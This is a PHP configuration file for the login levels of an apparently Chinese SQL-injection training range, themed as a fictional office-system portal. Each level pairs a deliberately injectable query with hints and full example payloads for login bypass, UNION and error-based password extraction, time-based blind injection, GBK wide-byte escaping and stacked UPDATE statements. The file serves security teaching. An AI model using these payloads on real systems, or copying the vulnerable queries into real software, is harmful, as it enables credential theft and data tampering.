<?php
// 登录类关卡配置（星辰OA 员工登录）
$card = [['姓名', 'name'], ['登录名', 'username']];

return [
[
  'id' => 'Less-11', 'title' => '员工登录', 'desc' => '星辰OA 员工工作台登录入口。', 'type' => 'login',
  'form' => ['uname' => '账号', 'passwd' => '密码'], 'submit' => '登 录', 'd' => 1,
  'sql' => "SELECT username, name FROM oa_employee WHERE username='{u}' and password='{p}' LIMIT 0,1",
  'f' => $card, 'err' => true,
  'task' => '通过登录框注入，拿到 oa_employee 表全部账号密码',
  'h' => [
    '登录框两个参数都进了 SQL。先在账号栏输入一个单引号，看是否报错——POST 参数和 GET 参数本质相同。',
    '单引号闭合。可先万能钥匙登录，也可 union 提数（查询共 2 列）。',
    "示例：uname=admin' or 1=1-- -&passwd=1 直接登录；提数：uname=-1' union select username,password from oa_employee-- -&passwd=1",
  ],
],
[
  'id' => 'Less-12', 'title' => '渠道员工登录', 'desc' => '分公司员工专用登录入口。', 'type' => 'login',
  'form' => ['uname' => '账号', 'passwd' => '密码'], 'submit' => '登 录', 'd' => 2,
  'sql' => 'SELECT username, name FROM oa_employee WHERE username=("{u}") and password=("{p}") LIMIT 0,1',
  'f' => $card, 'err' => true,
  'task' => '确认双引号括号闭合后提数',
  'h' => [
    '单引号报错语法不匹配时，看报错里引号附近的完整片段——这里是双引号加括号。',
    '闭合方式 username=("...")，先补 ") 再注释。',
    '示例：uname=-1") union select username,password from oa_employee-- -&passwd=1',
  ],
],
[
  'id' => 'Less-13', 'title' => '企业邮箱登录', 'desc' => '企业邮箱单点登录入口，登录后不显示账号信息。', 'type' => 'login',
  'form' => ['uname' => '邮箱账号', 'passwd' => '密码'], 'submit' => '登 录', 'd' => 2,
  'sql' => "SELECT username, name FROM oa_employee WHERE username=('{u}') and password=('{p}') LIMIT 0,1",
  'f' => $card, 'err' => true, 'info_ok' => '登录成功，正在进入工作台……',
  'task' => '登录成功不回显数据，改用报错注入提取员工表',
  'h' => [
    '成功只有提示、没有数据；但失败时页面会把 SQL 报错打出来。',
    '报错信息是数据出口：extractvalue / updatexml。闭合是 (\'...\')。',
    "示例：uname=admin') and extractvalue(1,concat(0x7e,(select password from oa_employee where username='admin'),0x7e))-- -&passwd=1",
  ],
],
[
  'id' => 'Less-14', 'title' => '合作伙伴登录', 'desc' => '供应商与合作伙伴登录入口。', 'type' => 'login',
  'form' => ['uname' => '账号', 'passwd' => '密码'], 'submit' => '登 录', 'd' => 2,
  'sql' => 'SELECT username, name FROM oa_employee WHERE username="{u}" and password="{p}" LIMIT 0,1',
  'f' => $card, 'err' => true, 'info_ok' => '登录成功，正在跳转……',
  'task' => '确认双引号闭合后用报错函数提数',
  'h' => [
    '失败时的报错依然是突破口，先确定闭合字符。',
    '双引号闭合、无数据回显 → updatexml / extractvalue。',
    "示例：uname=1\" and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from oa_employee),0x7e),1)-- -&passwd=1",
  ],
],
[
  'id' => 'Less-15', 'title' => '账号找回', 'desc' => '输入账号密码验证身份后找回。', 'type' => 'login',
  'form' => ['uname' => '账号', 'passwd' => '密码'], 'submit' => '验 证', 'd' => 3,
  'sql' => "SELECT username, name FROM oa_employee WHERE username='{u}' and password='{p}' LIMIT 0,1",
  'f' => $card, 'err' => false, 'info_ok' => '身份验证通过。', 'fail' => '账号或密码错误，请重试。',
  'task' => '页面无差异回显，用响应时间盲注提取数据',
  'h' => [
    '成功与失败话术不同但都不给数据，报错也不显示。此时只剩一个可观测维度：响应时间。',
    'POST 时间盲注，if + sleep。',
    "示例：uname=admin' and if(length((select password from oa_employee where username='admin'))>5,sleep(5),0)-- -&passwd=1",
  ],
],
[
  'id' => 'Less-16', 'title' => '账号找回（双引号）', 'desc' => '账号找回验证入口（无报错回显）。', 'type' => 'login',
  'form' => ['uname' => '账号', 'passwd' => '密码'], 'submit' => '验 证', 'd' => 3,
  'sql' => 'SELECT username, name FROM oa_employee WHERE username=("{u}") and password=("{p}") LIMIT 0,1',
  'f' => $card, 'err' => false, 'info_ok' => '验证通过。', 'fail' => '验证失败，请重试。',
  'task' => '无报错回显，用时间盲注或布尔差异提取数据',
  'h' => [
    '闭合字符和上一关不同——双引号加括号。',
    '闭合方式 username=("...")，POST 时间盲注。',
    "示例：uname=1\") and if(ascii(substr((select username from oa_employee limit 0,1),1,1))>100,sleep(5),0)-- -&passwd=1",
  ],
],
[
  'id' => 'Less-34', 'title' => '人事系统登录', 'desc' => '老版人事系统登录（GBK 编码），输入经 addslashes 转义。', 'type' => 'login',
  'form' => ['uname' => '账号', 'passwd' => '密码'], 'submit' => '登 录', 'd' => 4,
  'sql' => "SELECT username, name FROM oa_employee WHERE username='{u}' and password='{p}' LIMIT 0,1",
  'f' => $card, 'err' => true, 'esc' => 'addslashes', 'set_names' => 'gbk',
  'task' => 'POST 参数同样存在宽字节问题',
  'h' => [
    'POST 参数做了 addslashes 转义，但 GBK 连接下宽字节照样有效。',
    '账号栏输入 %df%27（URL 编码提交）即可逃逸引号。',
    "示例：uname=1%df%27 union select username,password from oa_employee-- -&passwd=1",
  ],
],
[
  'id' => 'Less-37', 'title' => '人事系统登录（二）', 'desc' => '人事系统登录（数据库层转义，GBK 连接）。', 'type' => 'login',
  'form' => ['uname' => '账号', 'passwd' => '密码'], 'submit' => '登 录', 'd' => 4,
  'sql' => "SELECT username, name FROM oa_employee WHERE username='{u}' and password='{p}' LIMIT 0,1",
  'f' => $card, 'err' => true, 'esc' => 'real', 'set_names' => 'gbk',
  'task' => 'POST 双参数转义，宽字节依旧有效',
  'h' => [
    '与上一关同款转义，只是换成了数据库层函数。',
    '账号栏提交 %df%27 逃逸引号。',
    "示例：uname=1%df%27 or 1=1--+&passwd=1 先登录成功再 union 提数",
  ],
],
[
  'id' => 'Less-42', 'title' => 'OA 后台登录', 'desc' => 'OA 管理后台登录入口。', 'type' => 'login',
  'form' => ['login_user' => '管理员账号', 'login_password' => '密码'], 'submit' => '登 录', 'd' => 3,
  'sql' => "SELECT username, name FROM oa_employee WHERE username='{u}' and password='{p}'",
  'f' => $card, 'err' => true, 'multi' => true, 'esc' => 'real',
  'task' => '两个输入只有一个做了转义——找出没转义的那个，用多语句改数据',
  'h' => [
    '账号做了数据库层转义，密码栏没有。注入点在密码参数，单引号闭合。',
    '支持多语句：登录成功与否不重要，第二句 UPDATE 会照样执行。',
    "示例：login_user=admin&login_password=1';update oa_employee set password='pwned' where id=1-- -",
  ],
],
[
  'id' => 'Less-43', 'title' => '运营后台登录', 'desc' => '运营管理后台登录入口。', 'type' => 'login',
  'form' => ['login_user' => '账号', 'login_password' => '密码'], 'submit' => '登 录', 'd' => 3,
  'sql' => "SELECT username, name FROM oa_employee WHERE username=('{u}') and password=('{p}')",
  'f' => $card, 'err' => true, 'multi' => true, 'esc' => 'real',
  'task' => '密码参数括号闭合 + 多语句',
  'h' => [
    '仍是密码参数未转义，但闭合方式多了括号：username=(\'...\')。',
    'payload 先补 ) 再分号接第二条语句。',
    "示例：login_user=admin&login_password=1');update oa_employee set password='pwned' where id=1-- -",
  ],
],
[
  'id' => 'Less-44', 'title' => '客服工作台登录', 'desc' => '客服团队工作台入口（无报错回显）。', 'type' => 'login',
  'form' => ['login_user' => '账号', 'login_password' => '密码'], 'submit' => '登 录', 'd' => 4,
  'sql' => "SELECT username, name FROM oa_employee WHERE username='{u}' and password='{p}'",
  'f' => $card, 'err' => false, 'multi' => true, 'esc' => 'real', 'fail' => '账号或密码错误。',
  'task' => '同 Less-42 但无报错回显，盲注验证后执行多语句',
  'h' => [
    '账号转义、密码未转义、单引号闭合——但失败不回显报错。',
    '先用布尔差异（登录成功/失败的页面话术）确认注入，再执行多语句。',
    "示例：login_user=admin&login_password=1';update oa_employee set password='pwned' where id=1-- -",
  ],
],
[
  'id' => 'Less-45', 'title' => '呼叫中心登录', 'desc' => '呼叫中心坐席登录入口（无报错回显）。', 'type' => 'login',
  'form' => ['login_user' => '坐席账号', 'login_password' => '密码'], 'submit' => '登 录', 'd' => 4,
  'sql' => "SELECT username, name FROM oa_employee WHERE username=('{u}') and password=('{p}')",
  'f' => $card, 'err' => false, 'multi' => true, 'esc' => 'real', 'fail' => '账号或密码错误。',
  'task' => '括号闭合 + 无报错回显 + 多语句',
  'h' => [
    '密码参数未转义，闭合是 (\'...\')，失败无报错。',
    '补 ) 后接多语句，用页面差异验证。',
    "示例：login_user=admin&login_password=1');update oa_employee set password='pwned' where id=1-- -",
  ],
],
];
